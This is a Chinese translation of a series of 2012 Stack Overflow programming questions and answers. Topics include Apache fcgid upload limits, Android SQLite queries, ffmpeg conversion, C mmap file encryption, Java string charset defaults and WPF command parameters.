我以 fastcgi 运行 php，设置为 post_max_size 200M upload_max_filesize 450M memeory_limit 32M safe_mode on

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-05T20:03:14.233

由于 httpmaxrequest length error 发生错误。这是由于 apache 的 mod_fcgid，所以我更改了 /etc/apache2/mods-available/fcgid.conf 中的 fcgid.conf

此外，必须更改此文件才能正常进行并行 plesk 上传。

/usr/local/psa/admin/conf/templates/default/domain/domainVirtualHost.php 中的 MaxRequestLen

然后重新配置域重新配置域：/usr/local/psa/admin/bin/httpdmng --reconfigure-all

重启nginx和apache

服务 nginx 重新启动 服务 apache2 重新启动

比一切都正常，可以通过这种方式上传。这是在运行并行 plesk 11 的 ubuntu 10.10 中发生的主要问题。

# android - Android中有什么方法可以知道哪个应用程序正在以编程方式在磁盘或设备内存上读取或写入数据

> ID：12659374
> 
> 赞同：2
> 
> 时间：2012-09-30T07:06:03.447
> 
> 标签：android, file-io, filesystems

我正在尝试练习[这篇文章](https://stackoverflow.com/a/12300003/829571)的建议，因为我发现它非常适合[这个问题](https://stackoverflow.com/questions/12299772/how-to-know-which-application-is-reading-or-writing-file-in-android)的答案。

因此，我已经`ls -l /proc/`在我的 java 应用程序中使用`Runtime.getRuntime().exec`.

我必须看到正在运行的进程的详细信息，因为它们进入了这个文件夹，但对于 PID。

为了获取进程所有者的应用程序详细信息（例如 app_25），我查看了 /data/data/ （带有`ls -l /data/data`）。我希望以下列方式从该文件夹中获取内容。

```
drwxr-x--x app_25   app_25            2012-02-23 08:30 com.android.mms 
```

不幸的是，我没有看到任何结果。我打算将进程所有者从以前的结果集映射`ls -l /proc/`到当前结果集的进程所有者`ls -l /data/data`。反正我错了吗？

# android - 选择查询中的 Android 错误

> ID：12659375
> 
> 赞同：-1
> 
> 时间：2012-09-30T07:06:04.667
> 
> 标签：android, android-sqlite

以下是导致问题的我的数据库方法：

```
 public Cursor fetchRecord(String pin,String category)throws SQLException
{

Cursor c=mDb.query(DATABASE_TABLE, new String[]
{KEY_ROWID,KEY_NAME,KEY_PHONE,KEY_CATEGORY,KEY_PINCODE},
KEY_PINCODE + "= ?" + "AND" + KEY_CATEGORY + "= ?",
new String[]{pin,category}, null, null, KEY_NAME);

    if (c!= null) {
        c.moveToFirst();
    }
    return c;
} 
```

每当我输入并单击日志猫说的第一个活动中的“开始”按钮时，它就会强制关闭：

```
Caused by: android.database.sqlite.SQLiteException: near "ANDcategory": syntax error: , while compiling: SELECT _id, name, phone, category, pincode FROM details WHERE pincode= ?ANDcategory= ? ORDER BY name 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T08:07:33.250

在您的 where 子句中，密码和类别之间必须有空格。

只需更换

```
"AND" 
```

和

```
" AND "

public Cursor fetchRecord(String pin,String category)throws SQLException 
{ 

        Cursor c=mDb.query(DATABASE_TABLE, new String[]
 {KEY_ROWID,KEY_NAME,KEY_PHONE,KEY_CATEGORY,KEY_PINCODE},
KEY_PINCODE + "= ?" + 
" AND " + KEY_CATEGORY + "= ?",new String[]{pin,category}, null, null, KEY_NAME); 

    if (c!= null) { 
        c.moveToFirst(); 
    } 
    return c; 
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-30T07:14:36.187

阅读异常，它会告诉您您需要知道的一切：

```
syntax error: , while compiling: SELECT _id, name, phone, category, pincode FROM details WHERE pincode= ?ANDcategory= ? ORDER BY name 
```

# java - Berkeley DB可以在java中异步使用吗？

> ID：12659376
> 
> 赞同：2
> 
> 时间：2012-09-30T07:06:10.820
> 
> 标签：java, asynchronous, berkeley-db, berkeley-db-je

有没有办法在 Berkeley DB 的 java 接口上执行非阻塞操作，并使用 Future 或类似的东西获取操作的状态和结果（比如使用 Future 获取 Callable 的结果）？

在数据库操作完成之前，我不希望调用数据库的线程被阻塞。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-10T07:36:46.857

从我在 API 文档中看到的内容来看，Berkeley DB JE 没有异步 API。对数据库的每次调用都会阻塞调用线程，直到操作完成。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-30T07:10:51.537

是的，您可以像使用任何数据库或资源一样，只需创建一个线程并启动它即可。

```
Runnable r = new Runnable() {
    public void run() {
        // call the DB
        // call your callback to run other tasks after with the result
    }
};
new Thread(r).start(); 
```

这是在 Java 中执行异步操作的标准方式。**您**负责线程，这与您似乎所指的 javascript 相反。

# javascript - 在将 html 数据添加到文档之前对其进行修改

> ID：12659378
> 
> 赞同：0
> 
> 时间：2012-09-30T07:06:37.163
> 
> 标签：javascript, jquery, html

我正在尝试修改来自外部 Web 服务的 ajax 调用返回的数据，然后再将其添加到类似于[此问题的文档中](https://stackoverflow.com/questions/9959278/how-can-i-modify-html-from-an-ajax-call-before-adding-it-into-document)

```
success: function (data) {
   $(data).find(".page td:nth-child(4)").hide();
   $("div.resultstable").html(data);
} 
```

数据格式如下

```
<div class="results">
   <div id="page1" class="page"
      <table>
         <tr> ... </tr>
      </table>
   </div>
   <div id="page2" class="page">
      <table>
         <tr> ... </tr>
      </table>
   </div>
</div> 
```

如果我`$(".page td:nth-child(4)").hide();`在 html(data) 行之后添加到我的成功函数，它可以工作，但我试图在将数据添加到文档之前修改数据。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T07:10:37.807

您可以简单地更改数据

```
success: function (data) {
   $(data).find(".page td:nth-child(4)").html("some data");

//or 
   $(data).find(".page td:nth-child(4)").append("some data");// to add some data

   $("div.resultstable").html(data);
} 
```

# php - JSON 的正确 MIME 类型？

> ID：12659379
> 
> 赞同：7
> 
> 时间：2012-09-30T07:07:11.480
> 
> 标签：php, json

> **可能重复：**
> [什么是正确的 JSON 内容类型？](https://stackoverflow.com/questions/477816/what-is-the-correct-json-content-type)

我在 json 上有问题，它只显示“Content-Type：text/html”我在 localhost 上测试，我的在线代码是

```
header('Access-Control-Allow-Origin: *');

header('Content-Type: application/javascript');
//header('Content-type: text/javascript');
//header('Content-type: application/json'); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-30T07:10:45.257

用这个

```
header('Content-type: application/json'); 
```

用于`JSON`数据

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-30T07:11:39.843

JSON 的 MIME 类型是`application/json`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-30T07:09:44.517

`application/json`JavaScript 对象表示法 (JSON)的媒体类型

```
header('Content-type: application/json'); 
```

从[IANA查到这个](http://www.ietf.org/rfc/rfc4627.txt)

**好读：**

[应用程序媒体类型](http://www.iana.org/assignments/media-types/application/index.html)

# ffmpeg - FFMPEG将webm转换为mp4不起作用

> ID：12659383
> 
> 赞同：2
> 
> 时间：2012-09-30T07:07:24.887
> 
> 标签：ffmpeg

我已经升级到支持 webm 的最新 ffmpeg，但我似乎无法将 webm 转换为 mp4

```
ffmpeg -i filea.webM -sameq filea.flv 
```

我收到此错误

```
swScaler: Unknown format is not supported as input pixel format
Cannot get resampling context 
```

我不知道该怎么办。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-10-15T09:49:53.010

后期的 ffmpeg 只需要 -i 参数

```
ffmpeg -i input_file.webm output_file.mp4 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-30T07:19:06.637

您要求转换为 mp4 但在命令中添加了 .flv 输出格式，请尝试：

```
ffmpeg -i your_input_filename.webm -qscale 0 your_outfile_name.mp4 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2014-01-09T23:27:45.780

```
ffmpeg -i file.webm -strict -2 file.mp4 
```

似乎没问题。

我使用 ffmpeg 版本 0.10.9-7:0.10.9-1~lucid1。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2014-10-04T08:24:38.327

在较新的 ffmpeg 版本中，“-sameq”选项已被删除，您必须改用“-qscale”。

```
ffmpeg -i your_input_filename.webm -qscale 0 your_outfile_name.mp4 
```

# c# - DataContractSerialization 和新的关键字继承

> ID：12659385
> 
> 赞同：0
> 
> 时间：2012-09-30T07:07:43.323
> 
> 标签：c#, inheritance, serialization, xml-serialization, datacontractserializer

我有一个问题，XML 元素“事件”由于 new 关键字而被序列化两次。我希望派生类型只被序列化。

```
[DataContract(Name = "Division", Namespace = "")]
    public class ApiTeamDivision : ApiDivision
    {
        [DataMember]
        public new ApiTeamEvent Event { get; set; }
        [JsonIgnore]
        public new ApiDivisionSettings Settings { get; set; }
        [JsonIgnore]
        public new List<ApiPrice> Prices { get; set; }
        [JsonIgnore]
        public new List<ApiTeam> Teams { get; set; }
        [JsonIgnore]
        public new List<ApiAsset> Assets { get; set; }
        [JsonIgnore]
        public new List<ApiBracket> Brackets { get; set; }
    }   

<Division>
<Age>17</Age>
<Event i:nil="true"/>
<Event>
   <Address i:nil="true"/>
   <Assets i:nil="true"/>
   <Description i:nil="true"/>
   <Divisions i:nil="true"/>
</Event>
</Division> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T07:27:45.107

不要在基类`[DataMember]`的属性上做标记`Event``ApiDivision`

```
class ApiDivision
{
    //[DataMember] => don't mark this
    public new ApiTeamEvent Event { get; set; }
} 
```

更重要的是，如果你使用`[DataContract]`，则无需使用属性`[JsonIgnore]`，因为它用于两种格式：json 和 Xml。

所以，如果你想在序列化中忽略属性，就不要用属性标记它`[DataMember]`

```
[DataContract(Name = "Division", Namespace = "")]
public class ApiTeamDivision : ApiDivision
{
    [DataMember]
    public new ApiTeamEvent Event { get; set; }

    public new ApiDivisionSettings Settings { get; set; }

    public new List<ApiPrice> Prices { get; set; }

    public new List<ApiTeam> Teams { get; set; }

    public new List<ApiAsset> Assets { get; set; }

    public new List<ApiBracket> Brackets { get; set; }
} 
```

**编辑**：

`(IsRequired=false, EmitDefaultValue=false)`或者，如果属性是，您可以使用忽略`null`：

```
class ApiDivision
{
    [DataMember(IsRequired=false, EmitDefaultValue=false)]
    public new ApiTeamEvent Event { get; set; }
} 
```

# objective-c - 在 mkmap 上显示速度 - Xcode

> ID：12659393
> 
> 赞同：0
> 
> 时间：2012-09-30T07:08:32.527
> 
> 标签：objective-c, ios, xcode, map, cllocationmanager

运行此日志时：

```
-(void) locationManager:(CLLocationManager *)manager didUpdateToLocation:(CLLocation *)newLocation fromLocation:(CLLocation *)oldLocation{

NSLog(@" new -> %@ \n old -> %@",(newLocation),(oldLocation)); 
```

我得到：

> 新 -> <+37.33328787,-122.05209673> +/- 5.00m（速度 33.57 mps / 路线 254.88）@ 2012 年 9 月 30 日，上午 9:53:15 东欧夏令时间
> 
> 旧 -> <+37.33336511,-122.05174034> +/- 5.00m（速度 33.73 mps / 路线 255.23）@ 2012 年 9 月 30 日，上午 9:53:14 东欧夏令时

如何在 UILabel 上实时显示“mps”（每秒米）显示的速度？

先感谢您..

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-30T10:10:33.513

`CLLocation`有财产`speed`。假设您想显示`location`'s `speed`in `label`，请执行以下操作：

```
NSString *speedString = [NSString stringWithFormat:@"Speed is %.2f meters per second.",location.speed];
label.text = speedString; 
```

`CLLocation`您可以通过使用 cmd-option-shift-? 在 Xcode 中搜索文档来了解更多属性或任何类，或者我在互联网上搜索“CLLocation 类参考”。您可以快速浏览这些文档顶部的大纲，寻找可能回答您问题的内容。通常，与类似任务相关的方法和属性被组合在一起。这使您可以轻松快速地确定课程是否可以满足您的需求。

希望这可以帮助！

# c - MMAP读写文件

> ID：12659395
> 
> 赞同：0
> 
> 时间：2012-09-30T07:08:36.950
> 
> 标签：c, mmap

我试图使用 mmap 读取文件，然后对其进行加密，然后将加密写入输出文件。我也在尝试使用 mmap 执行此操作，但是当我运行代码时，它告诉我由于“无效参数”而无法取消映射。

```
//Open files initialy and obtain a handle to the file.
inputFile = open(inFileName, O_RDONLY, S_IREAD);
outputFile = open(outFileName, O_APPEND | O_CREAT | O_TRUNC | O_WRONLY, S_IWRITE);

//Allocate buffers for encrption.
from = (unsigned char*)malloc(blockSize);
to = (unsigned char*)malloc(blockSize);

mmapWriteBuff = (unsigned char*)malloc(blockSize);
mmapReadBuff = (unsigned char*)malloc(blockSize);

memset(to, 0, blockSize);
memset(from, 0, blockSize);
memset(mmapWriteBuff, 0, blockSize);
memset(mmapReadBuff, 0, blockSize);

//Make sure we have permission to read the file provided.
setFilePermissions(inFileName, PERMISSION_MODE);
setFilePermissions(outFileName, PERMISSION_MODE);

if(encriptParam)
{
    printf("*Encripting file: %s *\n", inFileName);

do//Go through the entire file.
{   
    if(memParam)
    {
            currAmt = lseek(inputFile, blockSize, SEEK_SET);
        mmapReadBuff = mmap(0, blockSize, PROT_READ, MAP_SHARED, inputFile, 0);

        /*
         *This is how you encrypt an input char* buffer "from", of length "len"
         *onto output buffer "to", using key "key".  Jyst pass "iv" and "&n" as
         *shown, and don't forget to actually tell the function to BF_ENCRYPT.
         */

        BF_cfb64_encrypt(mmapReadBuff, mmapWriteBuff, blockSize, &key, iv, &n, BF_ENCRYPT);

        if(currAmt < blockSize)
        {
            writeAmt = lseek(outputFile, currAmt, SEEK_SET);
            mmapWriteBuff = mmap(0, currAmt, PROT_WRITE,  MAP_SHARED, outputFile, 0);                   
            if(errno == EINVAL)
            {
                perror("MMAP failed to start write buffer: ");

                exit(MMAP_IO_ERROR);
            }
        }
        else
        {
            writeAmt = lseek(outputFile, blockSize, SEEK_SET);
            mmapWriteBuff = mmap(0, blockSize, PROT_WRITE, MAP_SHARED, outputFile, 0);                  
            if(errno == EINVAL)
            {
                perror("MMAP failed to start write buffer: ");

                exit(MMAP_IO_ERROR);
            }
        }

        mmapWriteBuff = to;
    }
    else
    {
        currAmt = read(inputFile, from, blockSize);

        /*
         *This is how you encrypt an input char* buffer "from", of length "len"              *onto output buffer "to", using key "key".  Jyst pass "iv" and "n" as
         *shown, and don't forget to actually tell the function to BF_ENCRYT.
        */

        BF_cfb64_encrypt(from, to, blockSize, &key, iv, &n, BF_ENCRYPT);

        if(currAmt < blockSize)
        {
            writeAmt = write(outputFile, to, currAmt);
        }
        else
        {
            writeAmt = write(outputFile, to, blockSize);
        }
    }

    if(memParam)
    {
        //if(currAmt < blockSize)
        //{
        //  if(munmap(mmapWriteBuff, currAmt) == -1)
        //  {
        //      perror("MMAP failed to unmap itself: ");
        //      
        //      exit(MMAP_IO_ERROR);
        //  }
        //  
        //  if(munmap(mmapReadBuff, currAmt) == -1)
        //  {
        //      perror("MMAP failed to unmap itself: ");
        //      
        //      exit(MMAP_IO_ERROR);
        //  }
        //}
        //else
        //{

            if(munmap(mmapReadBuff, blockSize) == -1)
            {
                perror("MMAP Read Buffer failed to unmap itself: ");

                exit(MMAP_IO_ERROR);
            }

            if(munmap(mmapWriteBuff, blockSize) == -1)
            {
                perror("MMAP Write Buffer failed to unmap itself: ");                       
                exit(MMAP_IO_ERROR);
            }

        //}

    }

    memset(to, 0, strlen((char *)to));
    memset(from, 0, strlen((char *)from));
    memset(mmapReadBuff, 0, strlen((char*)mmapReadBuff));
    memset(mmapWriteBuff, 0, strlen((char*)mmapWriteBuff));
    }
    while(currAmt > 0);

    printf("*Saving file: %s *\n", outFileName); 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T08:11:32.107

一般来说，您可能想尝试设置不带标志的`outputFile`文件描述符。`O_WRONLY`使用`O_WRONLY`标志 for`mmap()`是不够的。

因此，您可能需要更改此设置：

```
outputFile = open(outFileName, O_APPEND | O_CREAT | O_TRUNC | O_WRONLY, S_IWRITE); 
```

对此：

```
outputFile = open(outFileName, O_APPEND | O_CREAT | O_TRUNC | O_RDWR, S_IWRITE); 
```

我不是专家`mmap()`，但我知道您可能希望在打开文件描述符时同时授予它读取和写入权限。

**编辑：** 您还想尝试将每个`mmap()`电话都转换**`(int*)`**成这样：

```
mmapReadBuff = (int*)mmap(0, blockSize, PROT_READ, MAP_SHARED, inputFile, 0); 
```

# objective-c - 向 xib 文件添加注释

> ID：12659397
> 
> 赞同：2
> 
> 时间：2012-09-30T07:08:49.047
> 
> 标签：objective-c, comments, xib

我正在研究具有许多对象的 xib 文件，这些对象相互隐藏并且代码也发生了变化。

我会通过在 xib 文件中添加注释来使我的工作和任何其他未来的程序员更容易。

我想把一些文本区域放在我正在使用的视图之外，但我想确保我不会影响最终的可执行文件。

这是一种有效的方法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-30T08:57:13.000

1./在interface-builder中，选择要评论的对象，打开检查器：在最后一个选项卡中（带有（i）图标，在检查器面板的底部，你会看到一个注释区域：在那里写你的评论. 您可能想点击“显示选择”。 2./ 在代码中注释任何应该以编程方式更改的对象

# java - 给定数组中的单元格，用于设置二维数组中的行、列和对角元素的函数

> ID：12659405
> 
> 赞同：0
> 
> 时间：2012-09-30T07:10:40.293
> 
> 标签：java, matrix, set, 2d, row

我需要一个具有以下签名的函数：

```
public void requiredFunction(int[][] array, int row, int column) {
    // code
} 
```

`array[row][column]`该函数应该增加与（除了`array[row][column]`它自己）相同的行、列和对角线中的所有值。

假设我有以下二维数组：

```
int[][] array = {
    0 0 0 0 0 0
    0 0 0 0 0 0
    0 0 0 0 0 0
    0 0 0 0 0 0
    0 0 0 0 0 0
    0 0 0 0 0 0
}; 
```

现在，当我使用以下值调用此函数时：

```
requiredFunction(array, 2, 2); 
```

它应该将数组转换为：

```
array = {
    1 0 1 0 1 0
    0 1 1 1 0 0
    1 1 0 1 1 1
    0 1 1 1 0 0
    1 0 1 0 1 0
    0 0 1 0 0 1
}; 
```

如果您将数组视为棋盘，则该函数将获取皇后的位置（行和列）并增加棋盘上皇后可以移动到的位置。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T07:46:21.023

这是更短的内容：

```
public void requiredFunction(int[][] array, int row, int column) {
  for (int i = 0; i < array.length; ++i) {
      for (int j = 0; j < array[i].length; ++j) {
           if (i == column && j == row)
               continue;
           if (Math.abs(i - column) == Math.abs(j - row) ||
               i - column == 0 || j - row == 0)
               array[i][j]++;                                    
      }
  }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-30T07:28:34.057

首先，行列很简单，比如说：

```
public void requiredFunction(int[][] array, int row, int column) {
    //row
    for(int i=0;i<arr.length;i++){
       if(i==col)continue;
       arr[row][i]++;
    }
    //col
    for(int i=0;i<arr[0].length;i++){
       if(i==col)continue;
       arr[i][col]++;
    }
} 
```

对于对角线，它有点复杂。您可以从选定的点开始，然后一个接一个地穿过对角线。例如，这段代码：

```
for(int i=row+1,j=col+1;;++i,++j){
   try{
       arr[i][j]++;
   }catch(IndexOutOfBoundsException e){//the i or j went too far from the board
       break;
   }
} 
```

将增加右下对角线中的值。`--i`使用代替`++i`或`--j`代替的类似循环`++j`将对其他对角线执行相同的操作。

**编辑：** 如下所述，最好使用常规终止条件而不是 IndexOutOfBoundsException，因此循环应该是：

```
for(int i = row+1, j = col+1; i <= arr.length && j <= arr[0].length; ++i, ++j){
   arr[i][j]++;
} 
```

# nstimer - 如何使用 Minitue 和 Second 格式在 UILabel 上显示 NStimer 的倒计时 9 分 59 秒？

> ID：12659409
> 
> 赞同：0
> 
> 时间：2012-09-30T07:11:13.173
> 
> 标签：nstimer

我的任务是在我的应用程序上添加一个计时器，该计时器显示在考试模式页面上。我已经完成了所有事情，但无法将总时间转换为 min:sec 格式。请任何人都可以帮助我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T07:14:36.373

您可以使用模运算：

```
int totalSecondsRemaining = // however you obtain it
int minutesRemaining = totalSecondsRemaining / 60; // integer division, truncates fractional part
int secondsRemaining = totalSecondsRemaining % 60; // modulo division

someLabel.text = [NSString stringWithFormat:@"%02d:%02d", minutesRemaining, secondsRemaining]; 
```

（注：这是小学数学……）

# java - 为什么 Java 的 String.getBytes() 使用“ISO-8859-1”

> ID：12659417
> 
> 赞同：19
> 
> 时间：2012-09-30T07:12:08.857
> 
> 标签：java, utf-8, character-encoding, iso-8859-1

来自 java.lang.StringCoding ：

```
String csn = (charsetName == null) ? "ISO-8859-1" : charsetName; 
```

这是从 Java.lang.getBytes() 使用的，在 linux jdk 7 中我一直认为 UTF-8 是默认字符集？

谢谢

* * *

## 回答 #1

> 赞同：39
> 
> 时间：2012-09-30T07:22:49.237

## 这有点复杂......

Java***尝试***使用默认字符编码来使用 String.getBytes() 返回字节。

*   默认字符集由系统 file.encoding 属性提供。
*   这是缓存的，在 JVM 启动后通过 System.setProperty(..) 更改它是没有用的。
*   如果 file.encoding 属性未映射到已知字符集，则指定 UTF-8。

....这是棘手的部分（可能永远不会发挥作用）....

如果系统无法使用默认字符集（UTF-8 或其他字符集）对字符串进行解码或编码，则会回退到 ISO-8859-1。如果回退不起作用......系统将失败！

.... 真的...（喘气！）...如果我指定的字符集无法使用，并且 UTF-8 或 ISO-8859-1 也无法使用，它会崩溃吗？

是的。StringCoding.encode(...) 方法中的 Java 源代码注释状态：

> // 如果我们找不到 ISO-8859-1（必需的编码），那么安装就会出现严重错误。

...然后它调用 System.exit(1)

* * *

## 那么，为什么在 getBytes() 方法中有意回退到 ISO-8859-1 呢？

尽管可能性不大，但用户 JVM 可能不支持 UTF-8 或 JVM 启动时指定的字符集的解码和编码。

那么，getBytes() 期间 String 类中是否正确使用了默认字符集？

不。但是，更好的问题是......

* * *

## String.getBytes() 是否兑现了它的承诺？

Javadoc 中定义的合同是正确的。

> 当此字符串无法以默认字符集编码时，此方法的行为未指定。当`CharsetEncoder`需要对编码过程进行更多控制时，应使用该类。

* * *

## 好消息（以及更好的做事方式）

始终建议在将字节转换为字符串时明确指定“ISO-8859-1”或“US-ASCII”或“UTF-8”或您想要的任何字符集，反之亦然——除非——您之前已经获得默认字符集并 100% 确定它是您需要的字符集。

请改用此方法：

```
public byte[] getBytes(String charsetName) 
```

要查找系统的默认值，只需使用：

```
Charset.defaultCharset() 
```

希望有帮助。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-09-30T07:40:41.327

默认情况下，无参数`String.getBytes()`方法*不*使用 ISO-8859-1。如果可以确定，它将使用默认平台编码。但是，如果它丢失或者是无法识别的编码，它会回退到 ISO-8859-1 作为“默认默认值”。

在实践中你应该*很少*看到这一点。通常会正确检测到平台默认编码。

但是，我强烈建议您在每次执行编码或解码操作时指定显式字符编码。即使您想要平台默认值，也要明确指定。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-09-30T07:16:34.717

这是出于兼容性的原因。

从历史上看，Windows 和 Unix 上所有未指定字符集的 java 方法当时都使用通用的，即`"ISO-8859-1"`.

正如 Isaac 和 javadoc 所提到的，使用了默认的平台编码（参见[Charset.java](http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/6-b14/java/nio/charset/Charset.java#597)）：

```
594    public static Charset defaultCharset() {
595        if (defaultCharset == null) {
596            synchronized (Charset.class) {
597                String csn = AccessController.doPrivileged(
598                    new GetPropertyAction("file.encoding"));
599                Charset cs = lookup(csn);
600                if (cs != null)
601                    defaultCharset = cs;
602                else
603                    defaultCharset = forName("UTF-8");
604            }
605        }
606        return defaultCharset;
607    } 
```

**在进行字符串到字节或字节到字符串的转换时，始终指定字符集。**

即使在这种情况下，`String.getBytes()`您仍然会发现一个不推荐使用的方法不采用字符集（其中大多数在 Java 1.1 出现时已被弃用）。就像字节顺序一样，平台格式无关紧要，重要的是存储格式的规范。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-04-05T19:37:56.537

详细说明 Skeet 的答案（这当然是正确的）

在[java.lang.String](http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/6-b14/java/lang/String.java#993)的源`getBytes()`调用`StringCoding.encode(char[] ca, int off, int len)`中，第一行有：

```
String csn = Charset.defaultCharset().name(); 
```

然后（不是立即但绝对）它调用`static byte[] StringEncoder.encode(String charsetName, char[] ca, int off, int len)`您引用的行的来源 - 作为 charsetName 传递 csn - 所以在这一行中，如果存在，`charsetName` **它将是默认字符集。**

# c# - Windows商店应用程序/ WinRT中的按钮鼠标效果？

> ID：12659422
> 
> 赞同：-1
> 
> 时间：2012-09-30T07:13:38.213
> 
> 标签：c#, microsoft-metro, windows-runtime

我在我的应用程序中有一些作为按钮布置的图块。我不太擅长 xaml，希望这里有人可以指导或展示我是如何让他们表现得像 windows 开始屏幕中的瓷砖一样。

我有一些模板集。当鼠标移到它上面时如何添加小边框以及如何使它看起来像单击时被按下。

我的按钮只是一个带有背景颜色的方形框。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T13:58:06.717

您必须编辑 Button 的控制模板。并添加一个额外的边框，它应该出现在 Pointer over state 上。在 Visual State manager 中编写您自己的动画来实现这一点。为了使这更容易，只需在 Expression Blend 中打开您的项目。右键单击按钮并选择编辑模板。默认模板会落入资源中，所以你可以随便修改。

[http://msdn.microsoft.com/en-us/library/cc294908.aspx](http://msdn.microsoft.com/en-us/library/cc294908.aspx)

要执行推送效果，需要在指针按下状态下为 Scale Transform 设置动画。

问候，

# c++ - operator== 和向量混淆

> ID：12659423
> 
> 赞同：1
> 
> 时间：2012-09-30T07:14:05.163
> 
> 标签：c++

我在将对象保存在向量中时遇到了一些麻烦，我想我需要对操作员做点什么。

```
std::vector<Foo> vec;
Foo a = Foo();
vec.push_back(a);

...

if(std::find(vec.begin(), vec.end(), a) < vec.end()) {
    // Found
} else {
    // Not found
} 
```

Foo 需要 operator== 来编译，我这样做

```
bool Foo::operator==(const Foo& rhs) {
    return this == &rhs;
} 
```

但据我了解，`vec.push_back`, 将复制 Foo 对象，因此我的 == 将返回 false。

因此，每当我进行搜索时，它就永远找不到。

在这里做什么是正确的？我希望避免切换到指针向量。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T07:18:20.333

更改实现`Foo::operator==`以比较 Foo 的成员变量是否相等，而不是检查身份。例如：

```
bool Foo::operator==(const Foo& rhs) const {
    return get_a() == rhs.get_a()
        && get_b() == rhs.get_b(); // and so on
} 
```

请注意，这也可以是一个`const`函数，因为它不应该修改任何成员变量并且应该可以在`const`Foo 的实例上使用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-30T07:22:56.617

你真的无能为力， std::vector<> （或者更确切地说是大多数标准容器）在插入时制作副本。如果两个 Foo 对象的相等性实际上是由它们的地址相等来定义的，那么您唯一能做的就是将指针存储在 std::vector<> 中。如果您想将指针存储在 std::vector<> 中，我建议存储智能指针，而不是像 std::shared_ptr<>、std::unique_ptr<>。

如果 Foo 太重而无法复制，您可以在 C++11 中使 Foo 仅移动，或者您可以使用 boost::containers::vector 和 boost::move 使其仅在 C++03 中移动。

可能更容易更改 operator==() 来比较成员变量。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-30T07:29:02.690

您`operator==`暗示身份是由其在内存中的位置定义的，但是您将值附加到向量并希望相等这一事实表明身份不是由位置定义的。

如果由于某种原因您没有基于任何其他成员的身份定义，则可以向 Foo 对象添加唯一标识符，可以在代码中比较该标识符：

```
bool operator==(const Foo &rhs)
{
    return this->m_id == rhs.m_id;
} 
```

# wpf - 通过 WPF MVVM 处理 CommandParameter

> ID：12659425
> 
> 赞同：1
> 
> 时间：2012-09-30T07:14:29.487
> 
> 标签：wpf, mvvm, commandparameter

我在 WPF 相当初学者。我有复选框，我希望每次检查更改都会执行一个获取 IsChecked 参数并执行一些操作的命令。

我的 XAML 文件中有下一个代码：

在我的 viewModel 我有下一个代码：

```
 private ICommand _addSelectedItemsCommand;
    public ICommand AddSelectedItemsCommand
    {
        get
        {
            if (_addSelectedItemsCommand == null)
            {
                _addSelectedItemsCommand = new RelayCommand(param => this.AddSelectedItems());
            }
            return _addSelectedItemsCommand;
        }
    }

    private void AddSelectedItems()
    {
        Do something...
    } 
```

但是对于“Do somthing”，我需要 IsChecked 参数，我怎样才能得到它？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T18:11:13.407

在你的 ViewModel RelayCommand 看起来像

```
private RelayCommand<string> AddSelectedItemsCommand{get;set;} 
```

在您的 ViewModel 构造函数代码中看起来像

```
AddSelectedItemsCommand=new RelayCommand<string>(AddSelectedItemsMethod);

void AddSelectedItemsMethod(string AddItem)
{
 Your Code Goes Here.
  } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-30T07:38:29.543

您应该使用[InvokeCommandAction](http://msdn.microsoft.com/en-us/library/system.windows.interactivity.invokecommandaction_members%28v=expression.40%29.aspx)类。您可以在 Expression Blend SDK 中找到它，也可以简单地将[这个 NuGet 包](http://nuget.org/packages/Blend.Interactivity.Wpf)添加到您的项目中。

```
<CheckBox
  xmlns:ei="http://schemas.microsoft.com/expression/2010/interactions"
  xmlns:i="http://schemas.microsoft.com/expression/2010/interactivity">
  <i:Interaction.Triggers>
    <i:EventTrigger EventName="Checked">
      <ei:InvokeCommandAction Command="{Binding AddSelectedItemsCommand}" CommandParameter="..." />
    </i:EventTrigger>
  </i:Interaction.Triggers>
</CheckBox> 
```

# jquery - 使用 Javascript 如何获取 dom 节点的伪 CSS 样式？

> ID：12659435
> 
> 赞同：1
> 
> 时间：2012-09-30T07:15:55.870
> 
> 标签：jquery, css, dom, pseudo-class

嗨，我有一个元素（dom 节点），它有一个伪 CSS 悬停 CSS 样式。我想使用 Javascript 来获得这种 CSS 样式，我在 Chrome 网络浏览器中。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-30T07:44:50.117

您可以使用获取元素的计算样式（当前应用的样式）`window.getComputedStyle(element)`

对于您的情况，您可以在元素悬停时调用上述内容，并稍后将保存的样式对象用于您的目的。

**参考**：[https ://developer.mozilla.org/en-US/docs/DOM/window.getComputedStyle](https://developer.mozilla.org/en-US/docs/DOM/window.getComputedStyle)

